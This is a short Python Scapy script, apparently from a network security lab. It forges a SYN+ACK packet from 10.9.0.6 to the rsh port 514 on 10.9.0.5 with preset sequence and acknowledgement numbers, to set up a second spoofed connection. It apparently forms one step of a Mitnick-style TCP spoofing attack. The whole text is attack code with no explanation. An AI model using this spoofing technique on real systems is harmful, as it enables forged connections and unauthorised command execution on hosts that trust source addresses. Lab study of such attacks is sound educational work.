from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=9090, dport=514, flags="SA", seq=378933595, ack=3814954128)

pkt = ip/tcp

print("sending syn+ack packet to establish 2nd connection")

ls(pkt)
send(pkt, verbose=0)
